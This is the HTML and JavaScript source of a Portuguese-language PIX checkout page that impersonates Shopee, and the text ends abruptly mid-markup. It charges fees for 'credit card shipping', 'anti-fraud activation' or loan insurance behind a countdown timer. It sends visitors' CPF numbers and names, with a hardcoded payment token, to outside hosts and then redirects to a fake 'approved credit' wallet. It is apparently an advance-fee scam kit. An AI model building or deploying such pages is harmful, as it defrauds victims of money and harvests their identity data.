<!DOCTYPE html>
<html lang="pt-br">
  <head>
    <meta charset="UTF-8" />

    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Checkout - Pagamento PIX</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="css/all.min.css" />
    <link
      href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap"
      rel="stylesheet"
    />
    <script>
      tailwind.config = {
        theme: {
          extend: {
            colors: {
              primary: {
                50: "#f0f9ff",
                100: "#e0f7fa",
                200: "#b2ebf2",
                500: "#2563eb",
                600: "#24CA68",
                700: "#1e40af",
              },
              secondary: {
                500: "#64748b",
                600: "#475569",
                700: "#334155",
                800: "#1e293b",
                900: "#0f172a",
              },
              shopee: {
                light: "#ff7337",
                DEFAULT: "#ee4d2d",
                dark: "#d5331a",
                gray: "#666666",
                lightgray: "#f6f6f6",
                bg: "#FFFFFF",
              },
            },
            fontFamily: {
              sans: ["Poppins", "system-ui", "sans-serif"],
            },
          },
        },
      };
    </script>
    <link
      href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap"
      rel="stylesheet"
    />
    <style>
      body {
        font-family: "Poppins", sans-serif;
        background-color: #f6f6f6;
        min-height: 100vh;
      }

      .pix-code-container {
        position: relative;
        overflow: hidden;
        white-space: nowrap;
        border: 1px solid #e2e8f0;
        border-radius: 0.375rem;
        background-color: #f8fafc;
        padding: 0.75rem 1rem;
        margin-bottom: 1rem;
        min-height: 48px;
        max-width: 100%;
        overflow-x: auto;
      }

      .pix-code-container::after {
        content: "";
        position: absolute;
        top: 0;
        right: 0;
        width: 60px;
        height: 100%;
        background: linear-gradient(
          to right,
          rgba(248, 250, 252, 0),
          rgba(248, 250, 252, 1) 80%
        );
        pointer-events: none;
      }

      .pix-code {
        font-family: "Roboto Mono", monospace;
        font-size: 0.875rem;
        color: #334155;
        white-space: nowrap;
        overflow-x: auto;
        scrollbar-width: none;
        -ms-overflow-style: none;
        padding: 0.5rem;
        min-height: 2.5rem;
        line-height: 1.5;
      }

      .pix-code::-webkit-scrollbar {
        display: none; /* Chrome, Safari, Opera */
      }

      .progress-ring {
        transform: rotate(-90deg);
      }

      .progress-ring__circle {
        stroke-dasharray: 283;
        transition: stroke-dashoffset 0.5s;
      }

      .notification-slide-in {
        animation: slideIn 0.3s forwards;
      }

      .notification-slide-out {
        animation: slideOut 0.3s forwards;
      }

      @keyframes slideIn {
        from {
          transform: translateY(-100%);
          opacity: 0;
        }
        to {
          transform: translateY(0);
          opacity: 1;
        }
      }

      @keyframes slideOut {
        from {
          transform: translateY(0);
          opacity: 1;
        }
        to {
          transform: translateY(-100%);
          opacity: 0;
        }
      }

      .pulse-animation {
        animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
      }

      @keyframes pulse {
        0%,
        100% {
          opacity: 1;
        }
        50% {
          opacity: 0.7;
        }
      }

      .loading-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: #ffffff;
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 9999;
      }

      .loading-container {
        text-align: center;
      }

      .loading-spinner {
        width: 50px;
        height: 50px;
        border: 4px solid #f3f3f3;
        border-top: 4px solid #ee4d2d;
        border-radius: 50%;
        animation: loadingSpin 1s linear infinite;
        margin: 0 auto 1rem auto;
      }

      .loading-text {
        color: #ee4d2d;
        font-size: 1rem;
        font-weight: 500;
      }

      .loading-dots {
        display: inline-flex;
        gap: 4px;
        margin-top: 8px;
      }

      .loading-dot {
        width: 8px;
        height: 8px;
        background-color: #ee4d2d;
        border-radius: 50%;
        animation: loadingPulse 1.4s ease-in-out infinite;
      }

      .loading-dot:nth-child(2) {
        animation-delay: 0.2s;
      }

      .loading-dot:nth-child(3) {
        animation-delay: 0.4s;
      }

      @keyframes loadingSpin {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }

      @keyframes loadingPulse {
        0%,
        100% {
          transform: scale(0.5);
          opacity: 0.3;
        }
        50% {
          transform: scale(1);
          opacity: 1;
        }
      }

      @media (max-width: 768px) {
        .grid-cols-2 {
          grid-template-columns: 1fr;
        }

        .qr-container {
          width: 100% !important;
          max-width: 280px !important;
          margin: 0 auto !important;
          aspect-ratio: 1 !important;
        }

        .qr-container img {
          width: 100% !important;
          height: auto !important;
          max-width: none !important;
        }

        .valor-display {
          font-size: 1.5rem !important;
        }

        .header-content {
          flex-direction: column;
          gap: 1rem;
        }

        .pix-code {
          white-space: nowrap !important;
          overflow-x: auto !important;
          font-size: 0.875rem !important;
        }

        .pix-code-container {
          max-width: 100% !important;
          overflow-x: auto !important;
        }

        .copy-button {
          width: 100% !important;
          margin-top: 0.75rem !important;
        }
      }

      @media (max-width: 480px) {
        .qr-container {
          max-width: 240px !important;
        }

        .header-title {
          font-size: 1.5rem !important;
        }

        .valor-display {
          font-size: 1.25rem !important;
        }

        .container-padding {
          padding: 1rem !important;
        }

        .pix-code {
          font-size: 0.75rem !important;
        }

        .copy-button {
          font-size: 0.875rem !important;
          padding: 0.625rem 1rem !important;
        }
      }

      .qr-container {
        position: relative;
        width: 100%;
        max-width: 300px;
        aspect-ratio: 1;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        background-color: #f8fafc;
        border-radius: 0.75rem;
        overflow: hidden;
      }

      .qr-container img {
        width: 100%;
        height: 100%;
        object-fit: contain;
        padding: 1rem;
      }

      .copy-button {
        width: 100%;
        min-height: 48px;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 0.75rem 1rem;
        font-size: 0.875rem;
        font-weight: 500;
        border-radius: 0.5rem;
        transition: all 0.2s;
        gap: 0.5rem;
      }
    </style>
    <script>
      // Vari√°veis globais
      let clienteData = null;
      let itemsData = null;
      let valorTotal = 3480; // Valor padr√£o em centavos
      let pixCode = null;
      let qrCodeUrl = null;
      let token = null;

      // Registrar todos os dados do localStorage no console
      (function logLocalStorageData() {
        console.log("üìã Dados do localStorage:");
        const storageData = {};
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          try {
            // Tentar analisar como JSON para objetos armazenados como string JSON
            const value = localStorage.getItem(key);
            try {
              storageData[key] = JSON.parse(value);
            } catch (e) {
              // Se n√£o for JSON v√°lido, armazenar como string
              storageData[key] = value;
            }
          } catch (e) {
            console.error(`Erro ao ler item do localStorage: ${key}`, e);
          }
        }
        console.table(storageData);
      })();

      function copiarPix() {
        const pixCodeElement = document.getElementById("pix-code");
        navigator.clipboard
          .writeText(pixCodeElement.innerText)
          .then(() => {
            mostrarNotificacao();

            const btnCopiar = document.getElementById("btn-copiar");
            const textoOriginal = btnCopiar.innerHTML;
            btnCopiar.innerHTML = '<i class="fas fa-check"></i> Copiado';
            btnCopiar.classList.remove("bg-[#ee4d2d]", "hover:bg-[#d5331a]");
            btnCopiar.classList.add("bg-green-600", "hover:bg-green-700");

            setTimeout(() => {
              btnCopiar.innerHTML = textoOriginal;
              btnCopiar.classList.remove("bg-green-600", "hover:bg-green-700");
              btnCopiar.classList.add("bg-[#ee4d2d]", "hover:bg-[#d5331a]");
            }, 3000);
          })
          .catch((err) => {
            console.error("Erro ao copiar: ", err);
          });
      }

      function copiarPixPeloQR() {
        const pixCodeElement = document.getElementById("pix-code");
        navigator.clipboard
          .writeText(pixCodeElement.innerText)
          .then(() => {
            mostrarNotificacao();

            // Efeito visual no QR code
            const qrContainer = document.querySelector(
              ".border-2.border-[#ee4d2d]"
            );
            qrContainer.classList.add("border-green-500");
            qrContainer.classList.remove("border-[#ee4d2d]");

            setTimeout(() => {
              qrContainer.classList.remove("border-green-500");
              qrContainer.classList.add("border-[#ee4d2d]");
            }, 2000);
          })
          .catch((err) => {
            console.error("Erro ao copiar: ", err);
          });
      }

      function mostrarNotificacao() {
        const notification = document.getElementById("notification");

        // Remover classes antigas
        notification.classList.remove(
          "opacity-0",
          "-translate-y-4",
          "opacity-100",
          "translate-y-0"
        );

        // Adicionar novas classes para anima√ß√£o
        notification.classList.add("opacity-100", "translate-y-0");

        setTimeout(() => {
          notification.classList.remove("opacity-100", "translate-y-0");
          notification.classList.add("opacity-0", "-translate-y-4");
        }, 3000);
      }

      // Contador regressivo com c√≠rculo de progresso
      function iniciarContador() {
        const tempoLimite = 5 * 60; // 15 minutos em segundos
        let tempoRestante = tempoLimite;

        const contadorElement = document.getElementById("contador-header");
        const circle = document.querySelector(".progress-ring__circle");
        const radius = circle.r.baseVal.value;
        const circumference = radius * 2 * Math.PI;

        circle.style.strokeDasharray = `${circumference} ${circumference}`;
        circle.style.strokeDashoffset = `${circumference}`;

        function setProgress(percent) {
          const offset = circumference - (percent / 100) * circumference;
          circle.style.strokeDashoffset = offset;
        }

        const interval = setInterval(() => {
          tempoRestante--;

          if (tempoRestante <= 0) {
            clearInterval(interval);
            if (contadorElement) {
              contadorElement.innerHTML = "Finalize seu pagamento urgente";
            }
            setProgress(0);
            return;
          }

          const percentLeft = (tempoRestante / tempoLimite) * 100;
          setProgress(percentLeft);

          const minutos = Math.floor(tempoRestante / 60);
          const segundos = tempoRestante % 60;

          const tempoFormatado = `${minutos
            .toString()
            .padStart(2, "0")}:${segundos.toString().padStart(2, "0")}`;
          if (contadorElement) {
            contadorElement.innerHTML = tempoFormatado;
          }

          // Adicionar anima√ß√£o de pulso quando estiver abaixo de 5 minutos
          if (tempoRestante < 300 && contadorElement) {
            contadorElement.classList.add("text-red-600", "pulse-animation");
          }
        }, 1000);

        // Iniciar com 100%
        setProgress(100);
      }

      // Fun√ß√£o para obter par√¢metros da URL
      function obterParametroUrl(nome) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(nome);
      }

      // Adicionar fun√ß√£o para formatar o valor
      function formatarValor(valor) {
        // Verifica se o valor √© uma string com ponto decimal (ex: "49.90")
        if (typeof valor === "string" && valor.includes(".")) {
          // Converte para centavos (multiplicando por 100)
          valor = Math.round(parseFloat(valor) * 100);
        }

        // Formata o valor como moeda brasileira
        return (valor / 100).toLocaleString("pt-BR", {
          style: "currency",
          currency: "BRL",
        });
      }

      // Fun√ß√£o para preservar par√¢metros UTM
      function preservarParametrosUtm() {
        const urlAtual = new URL(window.location.href);
        const utmParams = [
          "utm_source",
          "utm_campaign",
          "utm_medium",
          "utm_content",
          "utm_term",
          "utm_id",
          "xcod",
          "sck",
        ];

        // Sempre salvar os par√¢metros da URL atual, mesmo que vazios
        utmParams.forEach((param) => {
          const valor = urlAtual.searchParams.get(param);
          if (valor !== null) {
            localStorage.setItem(param, valor);
          }
        });

        // Se n√£o houver par√¢metros na URL atual, n√£o tentar recuperar do localStorage
        // Isso evita que par√¢metros antigos sejam restaurados incorretamente
        if (!utmParams.some((param) => urlAtual.searchParams.has(param))) {
          console.log("üîç Nenhum par√¢metro UTM encontrado na URL atual");
          return;
        }
      }

      // Atualizar a fun√ß√£o window.onload
      window.onload = async function () {
        // Preservar par√¢metros UTM
        preservarParametrosUtm();

        mostrarLoading();
        try {
          // Obter valor da URL se existir
          const valorUrl = obterParametroUrl("valor");
          if (valorUrl) {
            console.log("üîç Valor encontrado na URL:", valorUrl);

            // Converter o valor para centavos se for uma string com ponto decimal
            let valorEmCentavos;
            if (valorUrl.includes(".")) {
              valorEmCentavos = Math.round(parseFloat(valorUrl) * 100);
            } else {
              // Se for um n√∫mero inteiro, consideramos como centavos
              valorEmCentavos = parseInt(valorUrl, 10);
            }

            console.log("üí∞ Valor em centavos:", valorEmCentavos);

            // Atualizar display do valor
            document.getElementById("valor-display").textContent =
              formatarValor(valorEmCentavos);
            valorTotal = valorEmCentavos;

            // Gerar dados do cliente
            clienteData = await gerarDadosCliente();
            if (!clienteData) {
              throw new Error("Falha ao gerar dados do cliente");
            }
            console.log("‚úÖ Dados do cliente gerados:", clienteData);

            // Preparar itens
            itemsData = prepararItens(valorEmCentavos);
            console.log("‚úÖ Itens preparados:", itemsData);
          } else {
            console.log("üîÑ Gerando dados do cliente...");
            // Gerar dados do cliente
            clienteData = await gerarDadosCliente();
            if (!clienteData) {
              throw new Error("Falha ao gerar dados do cliente");
            }
            console.log("‚úÖ Dados do cliente gerados:", clienteData);

            // Preparar itens
            itemsData = prepararItens();
            console.log("‚úÖ Itens preparados:", itemsData);

            // Atualizar display do valor padr√£o
            document.getElementById("valor-display").textContent =
              formatarValor(valorTotal);
          }

          // Processar pagamento
          await processarPagamento();
        } catch (error) {
          console.error("‚ùå Erro na inicializa√ß√£o:", error);
          const errorContainer = document.getElementById("error-container");
          if (errorContainer) {
            errorContainer.textContent =
              "Erro ao inicializar o pagamento: " + error.message;
            errorContainer.classList.remove("hidden");
          }
        } finally {
          esconderLoading();
        }
      };

      // Gerar dados de cliente aleat√≥rios ou usar dados da URL
      async function gerarDadosCliente() {
        console.log("üîÑ Iniciando gera√ß√£o de dados do cliente...");
        try {
          mostrarLoading();

          // Primeiro, verificar se existem par√¢metros na URL
          const urlParams = new URLSearchParams(window.location.search);
          const nomeParam = urlParams.get("nome");
          let numeroParam = urlParams.get("numero");
          const cpfParam = urlParams.get("cpf");

          // Obter CPF do localStorage se dispon√≠vel
          const cpfLocalStorage = localStorage.getItem("cpf");
          console.log("üîç CPF encontrado no localStorage:", cpfLocalStorage);

          // Processar o n√∫mero de telefone para remover o prefixo internacional +55
          if (numeroParam) {
            // Remover caracteres n√£o num√©ricos
            numeroParam = numeroParam.replace(/\D/g, "");

            // Se come√ßar com 55, remover esse prefixo
            if (numeroParam.startsWith("55")) {
              numeroParam = numeroParam.substring(2);
            }

            console.log("üì± N√∫mero de telefone processado:", numeroParam);
          }

          // Se existirem par√¢metros na URL, usar esses dados
          if (nomeParam || numeroParam || cpfParam || cpfLocalStorage) {
            console.log("üîç Dados encontrados:", {
              nome: nomeParam,
              numero: numeroParam,
              cpfParam: cpfParam,
              cpfLocalStorage: cpfLocalStorage,
            });

            // Prioridade: 1. CPF da URL, 2. CPF do localStorage, 3. CPF gerado
            const cpfFinal = cpfParam || cpfLocalStorage || null;

            // Buscar o resto dos dados para complementar
            const response = await fetch(
              "https://scredito.it.com/shopee/checkout/api.php?gerar_dados"
            );
            if (!response.ok) {
              throw new Error(`HTTP error! status: ${response.status}`);
            }

            const dadosGerados = await response.json();

            // Combinar dados da URL/localStorage com dados gerados
            return {
              nome: nomeParam || dadosGerados.nome,
              email: dadosGerados.email,
              cpf: cpfFinal || dadosGerados.cpf,
              numero: numeroParam || "",
            };
          } else {
            // Se n√£o houver dados na URL nem localStorage, gerar todos os dados
            const response = await fetch(
              "https://scredito.it.com/shopee/checkout/api.php?gerar_dados"
            );
            if (!response.ok) {
              throw new Error(`HTTP error! status: ${response.status}`);
            }
            const data = await response.json();
            console.log("‚úÖ Dados do cliente recebidos:", data);
            return data;
          }
        } catch (error) {
          console.error("‚ùå Erro ao gerar dados do cliente:", error);
          throw new Error("N√£o foi poss√≠vel gerar os dados do cliente");
        } finally {
          esconderLoading();
        }
      }

      // Preparar itens para o pedido
      function prepararItens(valor = 4990) {
        let nomeProduto = "Frete para cart√£o de cr√©dito";

        // Se o valor for 19.90 (1990 em centavos), alterar o nome do produto
        if (valor === 1990) {
          nomeProduto = "Ativa√ß√£o de conta antifraude";
        }

        return [
          {
            id: 123,
            name: nomeProduto,
            price: valor,
            quantity: 1,
            product_type: "physical_goods",
          },
        ];
      }

      // Processar pagamento via API
      async function processarPagamento() {
        console.log("üîÑ Iniciando processamento de pagamento...");
        mostrarLoading();

        try {
          if (!clienteData) {
            throw new Error("Dados do cliente n√£o dispon√≠veis");
          }

          console.log("üì¶ Dados para processamento:", {
            cliente: clienteData,
            itens: itemsData,
            valor_total: valorTotal,
          });

          // Obter par√¢metros UTM da URL
          const urlParams = new URLSearchParams(window.location.search);
          const utmParams = {
            utm_source: urlParams.get("utm_source") || "",
            utm_campaign: urlParams.get("utm_campaign") || "",
            utm_medium: urlParams.get("utm_medium") || "",
            utm_content: urlParams.get("utm_content") || "",
            utm_term: urlParams.get("utm_term") || "",
            xcod: urlParams.get("xcod") || "",
            sck: urlParams.get("sck") || "",
            utm_id: urlParams.get("utm_id") || "",
          };

          console.log("üìä Par√¢metros UTM:", utmParams);

          // Enviar dados para a API
          console.log("üîÑ Enviando dados para API:", {
            cliente: clienteData,
            itens: itemsData,
            valor_total: valorTotal,
            ...utmParams,
          });

          // Log espec√≠fico para o CPF
          console.log("üÜî CPF sendo enviado para API:", clienteData.cpf);

          const response = await fetch(
            "https://origem-api-pix.28ugko.easypanel.host/iexperience",
            {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                credentials: {
                  token: "72fe9029-cc7b-4c76-8850-31ff432cfc3b",
                  name: "RAFAEL RIBEIRO",
                  offer: {
                    id: "RafaelRibeiro-CreditoShopee-72fe9029-cc7b-4c76-8850-31ff432cfc3b",
                    name: "Credito Shopee",
                  },
                },
                customer: {
                  name:
                    clienteData.nome.toUpperCase() || "MARIANO SIQUEIRA NEVES",
                  email: "joaopedrosilva@gmail.com",
                  document: {
                    type: "CPF",
                    number: clienteData.cpf.replace(/\D/g, ""),
                  },
                  phone: "21987364511",
                },

                paymentMethod: "PIX",
                amount: valorTotal,
                traceable: true,
                product: {
                  unitPrice: valorTotal,
                  title: "Credito e Pagamento",
                  quantity: 1,
                  tangible: true,
                },
              }),
            }
          );

          if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
          }

          const data = await response.json();
          console.log("‚úÖ Resposta da API:", data);

          if (data.status === "error") {
            let mensagemErro = "Erro ao processar pagamento: ";

            if (data.api_response) {
              console.error("Resposta da API:", data.api_response);
              if (data.api_response["items.0.id"]) {
                mensagemErro += "ID do produto inv√°lido. ";
              }
            }

            if (data.message) {
              mensagemErro += data.message;
            }

            if (data.details && Object.keys(data.details).length > 0) {
              console.error("Detalhes do erro:", data.details);
            }

            console.error(mensagemErro);

            // Mostrar mensagem de erro na interface
            const errorContainer = document.getElementById("error-container");
            if (errorContainer) {
              errorContainer.textContent = mensagemErro;
              errorContainer.classList.remove("hidden");
            }

            return;
          }

          // Nova estrutura da resposta
          if (response.ok) {
            console.log("Estrutura da resposta:", data);

            // Extrair dados do PIX da nova estrutura
            const pixData = {
              id: data.id,
              pix: {
                qrcode: data.pixCode,
                qrcode_image: data.pixQrCode,
              },
              valor: data.amount,
            };

            atualizarDadosPagamento(pixData);

            // Iniciar verifica√ß√£o de status
            if (data.id) {
              verificarStatusPagamento(data.id);
            }
          } else {
            console.error("Estrutura da resposta:", data);
            throw new Error("Dados do PIX n√£o encontrados na resposta");
          }
        } catch (error) {
          console.error("Erro ao processar pagamento:", error);

          // Mostrar mensagem de erro na interface
          const errorContainer = document.getElementById("error-container");
          if (errorContainer) {
            errorContainer.textContent = error.message;
            errorContainer.classList.remove("hidden");
          }
        } finally {
          esconderLoading();
        }
      }

      async function verificarStatusPagamento(paymentId) {
        try {
          console.log("üîÑ Verificando status do pagamento:", paymentId);
          const response = await fetch(
            `https://pay.iexperience-app.com/api/v1/transaction.getPaymentDetails?id=${paymentId}`,
            {
              headers: {
                Authorization: "72fe9029-cc7b-4c76-8850-31ff432cfc3b",
              },
            }
          );
          const data = await response.json();

          try {
            if (response.ok) {
              const status = data.status;
              console.log("‚úÖ Status do pagamento:", status);

              // Verifica se o pagamento foi aprovado
              if (status === "paid" || status === "APPROVED") {
                console.log("‚úÖ Pagamento confirmado! Redirecionando...");

                // Mant√©m os mesmos dados que j√° estavam sendo enviados
                const transactionData = {
                  id: data.id,
                  method: "pix",
                  status: "approved",
                  subtotal: valorTotal,
                  paid_value: valorTotal,
                  customer: clienteData,
                  createdAt: new Date().toISOString(),
                  approvedDate: new Date().toISOString(),
                };

                // Codificar dados em base64
                const transactionBase64 = btoa(JSON.stringify(transactionData));

                // Obter todos os par√¢metros da URL atual
                const currentUrlParams = new URLSearchParams(
                  window.location.search
                );
                const allParams = Array.from(currentUrlParams.entries())
                  .map(([key, value]) => `${key}=${encodeURIComponent(value)}`)
                  .join("&");

                // Salvar valor do empr√©stimo no localStorage para uso na carteira
                localStorage.setItem("creditoAprovadoValor", valorTotal / 100);

                // Salvar CPF no localStorage
                if (clienteData && clienteData.cpf) {
                  localStorage.setItem("cpf", clienteData.cpf);
                }

                // Salvar nome no localStorage
                if (clienteData && clienteData.nome) {
                  localStorage.setItem("nomeUsuario", clienteData.nome);
                }

                // Redirecionar para a carteira com todos os par√¢metros originais
                const redirectUrl = `/shopee/carteira/index.html?${allParams}`;
                console.log("üîÑ Redirecionando para:", redirectUrl);
                window.location.href = redirectUrl;
                return;
              }

              // Atualiza a interface com base no status
              atualizarStatusInterface(status.toLowerCase());

              // Continua verificando se n√£o foi finalizado
              if (
                ![
                  "PAID",
                  "APPROVED",
                  "CANCELLED",
                  "CANCELED",
                  "EXPIRED",
                ].includes(status)
              ) {
                setTimeout(() => verificarStatusPagamento(paymentId), 7000);
              }
            } else {
              console.error("‚ùå Erro na resposta:", data);
              if (data.message) {
                console.error("üìÑ Mensagem de erro:", data.message);
              }
              // Tentar novamente em caso de erro
              setTimeout(() => verificarStatusPagamento(paymentId), 7000);
            }
          } catch (jsonError) {
            console.error("‚ùå Erro ao processar JSON:", jsonError);
            console.error("üìÑ Texto recebido:", responseText);
            // Tentar novamente em caso de erro
            setTimeout(() => verificarStatusPagamento(paymentId), 7000);
          }
        } catch (error) {
          console.error("‚ùå Erro ao verificar status:", error);
          // Tentar novamente em caso de erro
          setTimeout(() => verificarStatusPagamento(paymentId), 7000);
        }
      }

      function atualizarStatusInterface(status) {
        const pixContainer = document.getElementById("pix-container");
        const notification = document.getElementById("notification");
        const notificationText = notification.querySelector("span");

        if (["approved", "paid", "completed"].includes(status)) {
          notificationText.textContent =
            "Pagamento confirmado! Seu seguro prestamista ser√° ativado em breve.";
          notification.classList.remove("bg-[#ee4d2d]");
          notification.classList.add("bg-[#ee4d2d]");
          notification.classList.remove("opacity-0", "-translate-y-4");
          pixContainer.classList.add("hidden");
        } else if (["cancelled", "canceled", "expired"].includes(status)) {
          notificationText.textContent =
            "Por favor, gere um novo c√≥digo PIX para finalizar sua compra.";
          notification.classList.remove("bg-[#ee4d2d]");
          notification.classList.add("bg-[#ee4d2d]");
          notification.classList.remove("opacity-0", "-translate-y-4");
          pixContainer.classList.add("hidden");
        }
      }

      function atualizarDadosPagamento(pixData) {
        console.log("Atualizando dados do pagamento:", pixData);

        const pixContainer = document.getElementById("pix-container");
        const pixCodeElement = document.getElementById("pix-code");
        const qrCodeElement = document.getElementById("qr-code");
        const errorContainer = document.getElementById("error-container");

        // Esconder mensagem de erro se existir
        if (errorContainer) {
          errorContainer.classList.add("hidden");
        }

        // Verificar se os dados do PIX est√£o dispon√≠veis
        if (!pixData || (!pixData.pix && !pixData.id)) {
          console.error("Dados do PIX n√£o encontrados:", pixData);
          if (errorContainer) {
            errorContainer.textContent =
              "Erro: Dados do PIX n√£o encontrados na resposta";
            errorContainer.classList.remove("hidden");
          }
          return;
        }

        // Atualizar c√≥digo PIX e QR code - compat√≠vel com ambas estruturas
        if (pixData.pix) {
          // Estrutura antiga
          pixCodeElement.textContent = pixData.pix.qrcode || "";
          qrCodeElement.src = pixData.pix.qrcode_image;
        } else {
          // Nova estrutura
          pixCodeElement.textContent = pixData.qrcode || pixData.pixCode || "";
          qrCodeElement.src = pixData.qrcode_image || pixData.qrCodeUrl;
        }

        // Mostrar container do PIX
        pixContainer.classList.remove("hidden");

        // Iniciar contador
        iniciarContador();
      }

      // Atualizar fun√ß√£o mostrarLoading
      function mostrarLoading() {
        const loadingOverlay = document.createElement("div");
        loadingOverlay.className = "loading-overlay";
        loadingOverlay.id = "loading-overlay";

        const loadingContainer = document.createElement("div");
        loadingContainer.className = "loading-container";

        const spinner = document.createElement("div");
        spinner.className = "loading-spinner";

        const loadingText = document.createElement("div");
        loadingText.className = "loading-text";
        loadingText.textContent = "Preparando seu pagamento";

        const loadingDots = document.createElement("div");
        loadingDots.className = "loading-dots";

        for (let i = 0; i < 3; i++) {
          const dot = document.createElement("div");
          dot.className = "loading-dot";
          loadingDots.appendChild(dot);
        }

        loadingContainer.appendChild(spinner);
        loadingContainer.appendChild(loadingText);
        loadingContainer.appendChild(loadingDots);
        loadingOverlay.appendChild(loadingContainer);
        document.body.appendChild(loadingOverlay);
      }

      // Esconder overlay de carregamento
      function esconderLoading() {
        const loadingOverlay = document.getElementById("loading-overlay");
        if (loadingOverlay) {
          loadingOverlay.remove();
        }
      }
    </script>
  </head>
  <body class="bg-shopee-lightgray min-h-screen font-[Poppins]">
    <noscript
      ><img
        height="1"
        width="1"
        style="display: none"
        src="https://www.facebook.com/tr?id=2368625296848153&ev=PageView&noscript=1"
    /></noscript>
    <div
      id="notification"
      class="fixed top-0 inset-x-0 bg-shopee text-white py-3 shadow-lg z-50 opacity-0 -translate-y-4 transition-all duration-300"
    >
      <div class="container mx-auto px-4 flex items-center justify-center">
        <i class="fas fa-check-circle mr-2"></i>
        <span class="font-medium">C√≥digo PIX copiado com sucesso</span>
      </div>
    </div>

    <!-- Cabe√ßalho principal -->
    <header class="bg-white py-4 shadow-sm border-b border-shopee">
      <div class="max-w-4xl mx-auto px-4">
        <div class="flex justify-between items-center">
          <img src="images/shopee-logo.png" alt="Logo Shopee" class="h-10" />
          <div class="flex items-center">
            <div class="text-right">
              <p class="text-xs text-shopee-gray">Tempo restante</p>
              <div class="flex items-center">
                <span id="contador-header" class="text-lg font-bold text-shopee"
                  >5:00</span
                >
                <svg class="progress-ring w-4 h-4 ml-2" viewBox="0 0 100 100">
                  <circle
                    class="progress-ring__circle"
                    stroke="rgba(238, 77, 45, 0.2)"
                    stroke-width="8"
                    fill="transparent"
                    r="45"
                    cx="50"
                    cy="50"
                  ></circle>
                  <circle
                    class="progress-ring__circle"
                    stroke="#ee4d2d"
                    stroke-width="8"
                    fill="transparent"
                    r="45"
                    cx="50"
                    cy="50"
                  ></circle>
                </svg>
              </div>
            </div>
          </div>
        </div>
      </div>
    </header>

    <!-- Banner em largura completa -->
    <div class="w-full mb-4">
      <img
        src="images/banner.png"
        alt="Instru√ß√µes de pagamento"
        class="w-full"
      />
    </div>

    <div class="max-w-3xl mx-auto px-4 py-4">
      <div
        class="bg-white rounded-lg shadow-lg overflow-hidden border border-shopee"
      >
        <!-- Cabe√ßalho com valor -->
        <div class="bg-white p-4 border-b border-shopee">
          <div class="flex justify-between items-center mb-2 header-content">
            <h1 class="text-xl font-bold text-shopee text-center w-full">
              Sua transa√ß√£o est√° pendente
              <br />
            </h1>
          </div>
          <p class="text-shopee-gray mb-3 text-xs md:text-sm text-center">
            Complete o pagamento para que possamos ativar seu seguro prestamista
            <br />
          </p>
          <div class="flex justify-center items-center">
            <div>
              <p class="text-xs text-shopee-gray">Valor a pagar</p>
              <p class="text-2xl font-bold text-shopee" id="valor-display">
                R$¬†29,87
              </p>
            </div>
          </div>
        </div>

        <!-- Container de erro (inicialmente oculto) -->
        <div
          id="error-container"
          class="bg-red-50 border-l-4 border-red-500 text-red-700 p-4"
        >
          Erro ao inicializar o pagamento: N√£o foi poss√≠vel gerar os dados do
          cliente
        </div>

        <!-- Container de status -->
        <div id="status-container" class="px-6"></div>

        <!-- Container do PIX -->
        <div id="pix-container" class="hidden p-6">
          <div class="flex flex-col md:grid md:grid-cols-2 gap-6">
            <!-- QR Code -->
            <div class="w-full flex flex-col items-center">
              <div
                class="border-2 border-[#ee4d2d] p-4 rounded-xl text-center cursor-pointer hover:border-[#d5331a] transition-colors duration-200 w-full max-w-[280px] bg-white"
                onclick="copiarPixPeloQR()"
              >
                <img
                  id="qr-code"
                  src=""
                  alt="QR Code PIX"
                  class="w-full h-auto"
                />
                <div
                  class="absolute inset-0 flex items-center justify-center bg-black bg-opacity-50 rounded-lg opacity-0 hover:opacity-100 transition-opacity duration-200"
                >
                  <span class="text-white text-sm font-medium"
                    ><i class="fas fa-copy mr-2"></i>Copiar c√≥digo</span
                  >
                </div>
              </div>
              <p class="text-sm text-shopee-gray mt-3 text-center">
                Escaneie o QR Code ou toque para copiar o c√≥digo
              </p>
            </div>

            <!-- C√≥digo PIX e Instru√ß√µes -->
            <div class="w-full">
              <div class="mb-6">
                <label class="block text-sm font-medium text-shopee mb-2"
                  >C√≥digo PIX</label
                >
                <div class="relative">
                  <div
                    class="border-2 border-[#ee4d2d] bg-white hover:border-[#d5331a] transition-colors duration-200 rounded-md p-3 overflow-hidden"
                  >
                    <div
                      id="pix-code"
                      class="text-shopee-gray font-mono text-sm overflow-x-auto"
                    ></div>
                  </div>
                  <button
                    id="btn-copiar"
                    onclick="copiarPix()"
                    class="mt-3 bg-[#ee4d2d] text-white hover:bg-[#d5331a] focus:ring-2 focus:ring-offset-2 focus:ring-[#ee4d2d] focus:outline-none w-full py-3 px-4 rounded-md font-medium flex items-center justify-center gap-2 transition-colors duration-200"
                  >
                    <i class="fas fa-copy"></i>
                    <span>Copiar c√≥digo PIX</span>
                  </button>
                </div>
              </div>

              <!-- Status do Pagamento -->
              <div
                class="bg-shopee-lightgray rounded-lg p-4 border border-[#ee4d2d]"
              >
                <div class="flex items-center justify-between">
                  <div>
                    <p class="text-sm font-medium text-shopee">
                      Status do Pagamento
                    </p>
                    <p class="text-xs text-shopee-gray">
                      Aguardando confirma√ß√£o de pagamento...
                    </p>
                  </div>
                  <div
                    class="animate-spin rounded-full h-5 w-5 border-2 border-[#ee4d2d] border-t-transparent"
                  ></div>
                </div>
              </div>
            </div>
          </div>

          <!-- Instru√ß√µes de pagamento estilo novo -->
          <div class="mt-6">
            <div
              class="bg-white p-6 rounded-xl shadow-md mx-auto border border-gray-200"
            >
              <p class="text-xl font-bold mb-5 text-shopee text-center">
